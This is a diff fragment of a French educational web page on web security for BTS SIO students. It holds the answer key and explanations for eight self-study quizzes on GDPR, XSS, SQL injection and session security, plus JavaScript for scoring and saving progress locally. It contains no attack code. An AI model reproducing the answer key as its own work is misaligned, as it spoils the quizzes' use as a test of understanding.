+                    explanation: "Le RGPD exige une réponse rapide (1 mois max) aux demandes d'exercice des droits."
+                },
+                {
+                    correct: "B",
+                    explanation: "La traçabilité RGPD consiste à documenter tous les traitements de données personnelles."
+                }
+            ],
+            2: [
+                {
+                    correct: "A",
+                    explanation: "Un hacker qui injecte du code relève de la sécurité (protection contre attaques intentionnelles)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Une panne par manque de RAM est un problème de sûreté (dysfonctionnement technique)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Limiter les tentatives de connexion protège contre les attaques par force brute."
+                },
+                {
+                    correct: "B",
+                    explanation: "Un bug qui supprime des données est un problème de sûreté (dysfonctionnement accidentel)."
+                },
+                {
+                    correct: "A",
+                    explanation: "Le chiffrement protège contre le vol intentionnel de données (sécurité)."
+                }
+            ],
+            3: [
+                {
+                    correct: "B",
+                    explanation: "Oublier une mise à jour est une erreur humaine non intentionnelle (risque accidentel)."
+                },
+                {
+                    correct: "A",
+                    explanation: "Une attaque DDoS est une action malveillante volontaire (risque intentionnel)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Collecter sans consentement viole le RGPD (risque réglementaire)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Un site qui plante pendant les soldes cause une perte de revenus (risque opérationnel)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Une faille XSS peut causer vol de données (intentionnel) + amende (réglementaire)."
+                }
+            ],
+            4: [
+                {
+                    correct: "B",
+                    explanation: "Le Front-End doit prioritairement se protéger contre XSS (Cross-Site Scripting)."
+                },
+                {
+                    correct: "B",
+                    explanation: "bcrypt avec salt est la méthode recommandée pour hacher les mots de passe."
+                },
+                {
+                    correct: "C",
+                    explanation: "Un développeur Fullstack doit maîtriser la sécurité front ET back."
+                },
+                {
+                    correct: "A",
+                    explanation: "Le rate limiting limite le nombre de requêtes pour éviter les attaques DDoS."
+                },
+                {
+                    correct: "B",
+                    explanation: "Les requêtes préparées empêchent l'injection SQL en séparant code et données."
+                }
+            ],
+            5: [
+                {
+                    correct: "A",
+                    explanation: "L'attaque commence toujours par la reconnaissance des points vulnérables."
+                },
+                {
+                    correct: "B",
+                    explanation: "XSS stocké affecte tous les visiteurs futurs, XSS réfléchi n'affecte que la victime actuelle."
+                },
+                {
+                    correct: "B",
+                    explanation: "htmlspecialchars() échappe les caractères HTML spéciaux pour éviter XSS."
+                },
+                {
+                    correct: "B",
+                    explanation: "L'échappement lors du stockage/affichage est le moment clé pour bloquer XSS."
+                },
+                {
+                    correct: "B",
+                    explanation: "htmlspecialchars() transforme < en &lt; pour empêcher l'exécution."
+                }
+            ],
+            6: [
+                {
+                    correct: "B",
+                    explanation: "Déléguer à un PSP évite de gérer soi-même les données de paiement sensibles."
+                },
+                {
+                    correct: "C",
+                    explanation: "Un site lent pendant les soldes cause des pertes de ventes (risque opérationnel)."
+                },
+                {
+                    correct: "A",
+                    explanation: "Les requêtes préparées PDO séparent SQL et données pour éviter l'injection."
+                },
+                {
+                    correct: "B",
+                    explanation: "password_verify() compare un mot de passe en clair avec son hash sécurisé."
+                },
+                {
+                    correct: "B",
+                    explanation: "Le RGPD exige un consentement libre, spécifique et éclairé."
+                }
+            ],
+            7: [
+                {
+                    correct: "B",
+                    explanation: "httpOnly (pas JS), secure (HTTPS), sameSite (CSRF) sécurisent les sessions."
+                },
+                {
+                    correct: "A",
+                    explanation: "Le fichier .env stocke les variables sensibles hors du code source."
+                },
+                {
+                    correct: "B",
+                    explanation: "npm audit détecte les vulnérabilités connues dans les dépendances Node.js."
+                },
+                {
+                    correct: "A",
+                    explanation: "CORS définit quels domaines externes peuvent accéder aux ressources de l'API."
+                },
+                {
+                    correct: "B",
+                    explanation: "Un plan de rollback permet de revenir rapidement à la version précédente."
+                }
+            ],
+            8: [
+                {
+                    correct: "B",
+                    explanation: "La règle d'or : toujours valider, échapper et assainir les données utilisateur."
+                },
+                {
+                    correct: "B",
+                    explanation: "OWASP ZAP est un scanner de sécurité gratuit pour les applications web."
+                },
+                {
+                    correct: "B",
+                    explanation: "La sécurité doit être intégrée dans tout le cycle de développement (DevSecOps)."
+                },
+                {
+                    correct: "B",
+                    explanation: "Le test d'intrusion (pentest) simule des attaques réelles pour identifier les vulnérabilités, tandis que l'audit vérifie la conformité aux normes et bonnes pratiques."
+                },
+                {
+                    correct: "B",
+                    explanation: "La veille permet de rester à jour sur les nouvelles menaces et contre-mesures."
+                }
+            ]
+        };
+
+        let quizScores = {};
+
+        // Fonction pour afficher/masquer les quiz
+        function toggleQuiz(quizId) {
+            const content = document.getElementById(`quiz${quizId}`);
+            const arrow = content.previousElementSibling.querySelector('.quiz-arrow');
+            
+            if (content.classList.contains('open')) {
+                content.classList.remove('open');
+                arrow.classList.remove('open');
+            } else {
+                content.classList.add('open');
+                arrow.classList.add('open');
+            }
+        }
+
+        // Fonction pour gérer les réponses aux quiz
+        function selectAnswer(quizId, questionId, isCorrect) {
+            const question = document.querySelectorAll(`#quiz${quizId} .quiz-question`)[questionId - 1];
+            const options = question.querySelectorAll('.quiz-option');
+            const feedback = question.querySelector('.quiz-feedback');
+            const feedbackText = feedback.querySelector('.feedback-text');
+            
+            // Désactiver toutes les options
+            options.forEach(option => {
+                option.style.pointerEvents = 'none';
+                if (option.onclick.toString().includes('true')) {
+                    option.classList.add('correct');
+                } else if (option === event.target) {
+                    option.classList.add(isCorrect ? 'correct' : 'incorrect');
+                }
+            });
+
+            // Afficher le feedback
+            const data = quizData[quizId][questionId - 1];
+            feedbackText.innerHTML = `<strong>${isCorrect ? '✅ Correct !' : '❌ Incorrect.'}</strong><br>${data.explanation}`;
+            feedback.classList.add('show');
+            feedback.className = `quiz-feedback show ${isCorrect ? 'feedback-correct' : 'feedback-incorrect'}`;
+
+            // Mettre à jour le score
+            if (!quizScores[quizId]) {
+                quizScores[quizId] = { correct: 0, total: 0 };
+            }
+            
+            if (isCorrect) {
+                quizScores[quizId].correct++;
+            }
+            quizScores[quizId].total++;
+
+            // Afficher le score final si toutes les questions sont répondues
+            if (quizScores[quizId].total === 5) {
+                setTimeout(() => showQuizScore(quizId), 1000);
+            }
+        }
+
+        // Fonction pour afficher le score final
+        function showQuizScore(quizId) {
+            const score = quizScores[quizId];
+            const scoreElement = document.querySelector(`#quiz${quizId} .quiz-score`);
+            const scoreText = scoreElement.querySelector('.score-text');
+            const percentage = Math.round((score.correct / score.total) * 100);
+            
+            let message = '';
+            let emoji = '';
+            
+            if (percentage >= 80) {
+                emoji = '🏆';
+                message = 'Excellent ! Vous maîtrisez parfaitement les concepts.';
+            } else if (percentage >= 60) {
+                emoji = '👍';
+                message = 'Bon travail ! Quelques points à revoir.';
+            } else {
+                emoji = '📚';
+                message = 'Il faut réviser ce chapitre. Relisez les sections concernées.';
+            }
+            
+            scoreText.innerHTML = `${emoji} Score : ${score.correct}/${score.total} (${percentage}%)<br>${message}`;
+            scoreElement.classList.add('show');
+        }
+
+        // Fonction pour gérer les onglets
+        function showTab(tabName, tabElement) {
+            // Cacher tous les contenus
+            const contents = tabElement.closest('.section').querySelectorAll('.tab-content');
+            contents.forEach(content => content.classList.remove('active'));
+            
+            // Désactiver tous les onglets
+            const tabs = tabElement.closest('.section').querySelectorAll('.tab');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Afficher le contenu sélectionné
+            document.getElementById(tabName).classList.add('active');
+            
+            // Activer l'onglet cliqué
+            tabElement.classList.add('active');
+        }
+
+        // Fonction pour gérer les checkboxes des checklists
+        function toggleCheckbox(item) {
+            const checkbox = item.querySelector('.checkbox');
+            checkbox.classList.toggle('checked');
+            
+            // Animation de satisfaction
+            if (checkbox.classList.contains('checked')) {
+                item.style.transform = 'translateX(10px)';
+                setTimeout(() => {
+                    item.style.transform = 'translateX(0)';
+                }, 200);
+            }
+        }
+
+        // Fonction pour la navigation fluide
+        function smoothScroll() {
+            const links = document.querySelectorAll('.nav-links a');
+            links.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const target = document.querySelector(this.getAttribute('href'));
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                });
+            });
+        }
+
+        // Fonction pour marquer la section active dans la navigation
+        function updateActiveNav() {
+            const sections = document.querySelectorAll('.section');
+            const navLinks = document.querySelectorAll('.nav-links a');
+            
+            window.addEventListener('scroll', () => {
+                let current = '';
+                sections.forEach(section => {
+                    const sectionTop = section.offsetTop;
+                    const sectionHeight = section.clientHeight;
+                    if (window.pageYOffset >= sectionTop - 100) {
+                        current = section.getAttribute('id');
+                    }
+                });
+
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.getAttribute('href') === `#${current}`) {
+                        link.classList.add('active');
+                    }
+                });
+            });
+        }
+
+        // Fonction pour l'animation au scroll
+        function animateOnScroll() {
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.animation = 'fadeInUp 0.6s ease-out';
+                    }
+                });
+            }, {
+                threshold: 0.1
+            });
+
+            document.querySelectorAll('.section').forEach(section => {
+                observer.observe(section);
+            });
+        }
+
+        // Fonction pour sauvegarder les progrès localement
+        function saveProgress() {
+            const progress = {
+                scores: quizScores,
+                checkedItems: []
+            };
+            
+            document.querySelectorAll('.checkbox.checked').forEach(checkbox => {
+                const item = checkbox.closest('.checklist-item');
+                const text = item.querySelector('span').textContent;
+                progress.checkedItems.push(text);
+            });
+            
+            localStorage.setItem('bts_security_progress', JSON.stringify(progress));
+        }
+
+        // Fonction pour charger les progrès sauvegardés
+        function loadProgress() {
+            const saved = localStorage.getItem('bts_security_progress');
+            if (saved) {
+                const progress = JSON.parse(saved);
+                
+                // Restaurer les scores
+                quizScores = progress.scores || {};
+                
+                // Restaurer les items cochés
+                if (progress.checkedItems) {
+                    progress.checkedItems.forEach(itemText => {
+                        const items = document.querySelectorAll('.checklist-item span');
+                        items.forEach(span => {
+                            if (span.textContent === itemText) {
+                                const checkbox = span.closest('.checklist-item').querySelector('.checkbox');
+                                checkbox.classList.add('checked');
+                            }
+                        });
+                    });
+                }
+            }
+        }
+
+        // Initialisation au chargement de la page
+        document.addEventListener('DOMContentLoaded', function() {
+            smoothScroll();
+            updateActiveNav();
+            animateOnScroll();
+            loadProgress();
+            
+            // Sauvegarder automatiquement les progrès
+            setInterval(saveProgress, 30000); // Toutes les 30 secondes
+            
+            // Afficher un message de bienvenue
+            setTimeout(() => {
+                console.log('🎓 Chapitre de sécurité web chargé !');
+                console.log('💡 Astuce : Vos progrès sont sauvegardés automatiquement.');
+            }, 1000);
+        });
+
+        // Fonction pour imprimer uniquement le contenu pertinent
+        window.addEventListener('beforeprint', function() {
+            // Cacher les éléments non nécessaires à l'impression
+            document.querySelectorAll('.nav-fixed, .quiz-content, .nav-buttons').forEach(el => {
+                el.style.display = 'none';
+            });
+        });
+
+        window.addEventListener('afterprint', function() {
+            // Restaurer l'affichage après impression
+            document.querySelectorAll('.nav-fixed, .nav-buttons').forEach(el => {
+                el.style.display = '';
+            });
+        });
+
+        // Gestion du responsive pour mobile
+        function handleMobile() {
+            if (window.innerWidth <= 768) {
+                // Ajuster les timelines pour mobile
+                document.querySelectorAll('.timeline-item').forEach((item, index) => {
+                    item.style.left = '10%';
+                    item.style.width = '80%';
+                    item.style.textAlign = 'left';
+                });
+                
+                // Ajuster les cartes flip pour mobile
+                document.querySelectorAll('.flip-card').forEach(card => {
+                    card.style.height = '180px';
+                });
+            }
+        }
+
+        window.addEventListener('resize', handleMobile);
+        handleMobile(); // Exécuter au chargement
+
+        // Fonction d'aide contextuelle
+        function showHelp(topic) {
+            const helpMessages = {
+                'rgpd': 'Le RGPD (Règlement Général sur la Protection des Données) est obligatoire depuis 2018 pour toute organisation qui traite des données personnelles.',
+                'xss': 'XSS (Cross-Site Scripting) permet d\'injecter du code JavaScript malveillant dans une page web.',
+                'sql': 'L\'injection SQL consiste à insérer du code SQL malveillant dans une requête pour accéder à la base de données.',
+                'csrf': 'CSRF (Cross-Site Request Forgery) force un utilisateur authentifié à exécuter une action non désirée.'
+            };
+            
+            if (helpMessages[topic]) {
+                alert(`💡 ${helpMessages[topic]}`);
+            }
+        }
+
+        // Messages d'encouragement aléatoires pour les quiz
+        const encouragements = [
+            "🚀 Continuez comme ça !",
+            "💪 Vous progressez bien !", 
+            "🎯 Excellente compréhension !",
+            "⭐ Très bonne réponse !",
+            "🏆 Bravo, c'est parfait !"
+        ];
+
+        function getRandomEncouragement() {
+            return encouragements[Math.floor(Math.random() * encouragements.length)];
+        }
+
+        // Fonction pour générer un rapport de progression
+        function generateProgressReport() {
+            const report = {
+                totalQuizzes: 8,
+                completedQuizzes: Object.keys(quizScores).length,
+                averageScore: 0,
+                strongAreas: [],
+                improvementAreas: []
+            };
+
+            if (report.completedQuizzes > 0) {
+                let totalPercentage = 0;
+                Object.values(quizScores).forEach(score => {
+                    const percentage = (score.correct / score.total) * 100;
+                    totalPercentage += percentage;
+                    
+                    if (percentage >= 80) {
+                        report.strongAreas.push(`Quiz ${Object.keys(quizScores).find(key => quizScores[key] === score)}`);
+                    } else if (percentage < 60) {
+                        report.improvementAreas.push(`Quiz ${Object.keys(quizScores).find(key => quizScores[key] === score)}`);
+                    }
+                });
+                
+                report.averageScore = Math.round(totalPercentage / report.completedQuizzes);
+            }
+
+            return report;
+        }
+
+        // Afficher le rapport en console pour le debug
+        setInterval(() => {
+            if (Object.keys(quizScores).length > 0) {
+                console.log('📊 Rapport de progression:', generateProgressReport());
+            }
+        }, 60000); // Toutes les minutes
+
+        // Easter egg pour les développeurs curieux
+        console.log(`
+🎓 BTS SIO - Chapitre Sécurité Web
+════════════════════════════════════
+
+👨‍💻 Développé avec ❤️ pour mes étudiants
+🛡️ Sécurité et Sûreté : concepts essentiels
+📚 8 sections, 8 quiz, nombreux exemples
+
+💡 Astuce développeur :
+   - Vos progrès sont en localStorage
+   - Les quiz sont en JavaScript vanilla
+   - Design responsive intégré
+
+🚀 Bon apprentissage de la cybersécurité !
+        `);
+        
+    </script>
+
+    <!-- CSS pour l'impression -->
+    <style media="print">
+        .nav-fixed, .quiz-content, .nav-buttons { display: none !important; }
+        .section { page-break-inside: avoid; margin: 20px 0; }
+        .flip-card-inner { transform: none !important; }
+        .flip-card-back { transform: none !important; display: block !important; position: relative !important; }
+        .code-comparison { flex-direction: column; }
+        body { background: white !important; }
+        .alert { border: 1px solid #ccc !important; }
+    </style>
+</body>
+</html>
